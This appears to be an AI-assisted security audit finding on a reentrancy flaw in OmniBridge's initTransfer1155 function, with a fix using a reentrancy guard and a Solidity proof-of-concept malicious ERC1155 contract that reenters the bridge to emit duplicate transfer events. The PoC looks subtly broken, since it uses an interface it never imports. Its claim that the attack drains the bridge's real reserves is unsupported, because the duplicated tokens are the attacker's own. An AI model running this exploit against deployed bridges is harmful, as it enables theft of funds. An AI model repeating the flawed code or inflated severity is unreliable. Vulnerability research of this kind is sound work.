### Title
Reentrancy in `initTransfer1155` via Malicious ERC1155 Token Allows Minting Unbacked Tokens on NEAR - (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

### Summary
`OmniBridge.initTransfer1155` makes an external call to an untrusted, attacker-controlled ERC1155 token contract without a reentrancy guard. A malicious ERC1155 token can reenter `initTransfer1155` during `safeTransferFrom`, causing multiple `InitTransfer` events to be emitted with distinct nonces while only locking tokens for one of them. The NEAR side treats each emitted `InitTransfer` event as proof that tokens are held, so it mints tokens for every event — resulting in unbacked token minting and theft of bridged funds.

### Finding Description

`initTransfer1155` increments `currentOriginNonce` before the external call (a partial CEI attempt), then calls `IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "")` on an arbitrary, unregistered, attacker-supplied ERC1155 token contract. [1](#0-0) 

There is no `nonReentrant` modifier and no `ReentrancyGuardUpgradeable` import anywhere in the contract. [2](#0-1) 

The CLAUDE.md security invariant states "State before external calls … This is the primary reentrancy defense," but incrementing the nonce only prevents replay of the *same* nonce — it does not prevent a reentrant call from obtaining a *fresh* nonce and emitting a second `InitTransfer` event. [3](#0-2) 

The `onERC1155Received` guard checks `operator != address(this)` to block direct sends, but this check is irrelevant to the attack: the malicious token's `safeTransferFrom` implementation is fully attacker-controlled and can call back into `initTransfer1155` before (or instead of) calling `onERC1155Received`. [4](#0-3) 

The NEAR side's `fin_transfer_callback` only verifies that the emitter address is a registered factory; it does not and cannot verify that the ERC1155 tokens were actually locked on EVM. [5](#0-4) 

### Impact Explanation

**Critical — unauthorized minting / escrow mis-accounting.**

The NEAR bridge contract treats every on-chain `InitTransfer` event as authoritative proof that tokens are held in escrow on EVM. By emitting two events (nonces N and N+1) while locking only one batch of tokens, the attacker receives 2× the token amount on NEAR. The attacker can then bridge the surplus back to EVM, draining the bridge's ERC1155 reserves.

### Likelihood Explanation

**High.** The attack requires only:
1. Deploying a malicious ERC1155 contract (permissionless, trivial).
2. Calling `logMetadata1155` on the bridge with the malicious token (permissionless).
3. Waiting for NEAR to process the `LogMetadata` event and deploy the token via `deploy_token`.
4. Calling `initTransfer1155` with the malicious token.

No admin access, no leaked keys, and no privileged role is required. Any unprivileged user can execute this.

### Recommendation

Add OpenZeppelin's `ReentrancyGuardUpgradeable` to `OmniBridge` and apply the `nonReentrant` modifier to both `initTransfer`, `initTransfer1155`, and `finTransfer`. This is the same fix applied in the referenced external report.

```solidity
import {ReentrancyGuardUpgradeable} from
    "@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol";

contract OmniBridge is
    UUPSUpgradeable,
    AccessControlUpgradeable,
    SelectivePausableUpgradable,
    ReentrancyGuardUpgradeable,
    IERC1155Receiver
{
    ...
    function initTransfer1155(...) external payable nonReentrant whenNotPaused(PAUSED_INIT_TRANSFER) { ... }
    function initTransfer(...)    external payable nonReentrant whenNotPaused(PAUSED_INIT_TRANSFER) { ... }
    function finTransfer(...)     external payable nonReentrant whenNotPaused(PAUSED_FIN_TRANSFER)  { ... }
```

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC1155} from "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";
import {IOmniBridge} from "./IOmniBridge.sol";

contract MaliciousERC1155 {
    IOmniBridge public bridge;
    bool public reentered;
    uint256 public tokenId = 1;
    mapping(address => mapping(uint256 => uint256)) public balances;

    constructor(address _bridge) {
        bridge = IOmniBridge(_bridge);
    }

    function mint(address to, uint256 id, uint256 amount) external {
        balances[to][id] += amount;
    }

    // Attacker calls this to start the attack
    function attack(string calldata nearRecipient) external {
        // Step 1: approve bridge (no-op for malicious token)
        // Step 2: call initTransfer1155 — this triggers safeTransferFrom below
        bridge.initTransfer1155(address(this), tokenId, 100, 0, 0, nearRecipient, "");
    }

    // Called by bridge during initTransfer1155 (outer call, nonce N)
    function safeTransferFrom(
        address from, address to, uint256 id, uint256 amount, bytes calldata
    ) external {
        if (!reentered) {
            reentered = true;
            // Reenter: bridge increments nonce to N+1, locks tokens for real
            bridge.initTransfer1155(address(this), tokenId, 100, 0, 0, "attacker.near", "");
            // After inner call: two InitTransfer events emitted (N and N+1)
            // Only inner call actually "transferred" tokens
            reentered = false;
            // Outer call returns without updating balances — no tokens locked
        } else {
            // Inner call: actually update balances so bridge holds tokens
            balances[from][id] -= amount;
            balances[to][id] += amount;
            // Call onERC1155Received so bridge accepts the inner transfer
            bytes4 retval = IERC1155Receiver(to).onERC1155Received(
                address(bridge), from, id, amount, ""
            );
            require(retval == IERC1155Receiver.onERC1155Received.selector);
        }
    }

    // Required interface stubs
    function balanceOf(address owner, uint256 id) external view returns (uint256) {
        return balances[owner][id];
    }
    function setApprovalForAll(address, bool) external {}
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
}
```

**Result:** Two `InitTransfer` events are emitted on EVM (nonces N and N+1, each for 100 tokens). Only 100 tokens are actually held by the bridge. The NEAR side processes both events and mints 200 tokens to the attacker's NEAR account. The attacker bridges the surplus 100 tokens back to EVM, stealing 100 tokens from the bridge's reserves.
